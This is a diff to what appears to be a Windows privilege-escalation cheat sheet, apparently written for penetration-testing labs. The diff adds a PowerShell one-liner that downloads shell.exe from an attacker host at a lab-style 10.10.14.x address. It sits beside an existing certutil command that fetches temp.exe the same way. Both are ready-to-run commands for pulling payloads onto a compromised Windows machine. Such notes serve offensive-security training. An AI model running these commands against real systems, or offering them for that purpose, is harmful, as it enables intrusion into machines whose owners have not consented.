@@ -85,6 +85,11 @@ first go to c:/temp folder
 certutil -urlcache -f http://10.10.14.32/temp.exe temp.exe
 ```
 
+## Download files using powershell
+```
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.1/shell.exe', 'c:\Users\Public\Downloads\shell.exe')"
+```
+
 ## Windows subsystem for linux
 
 ### Search for bash or wsl
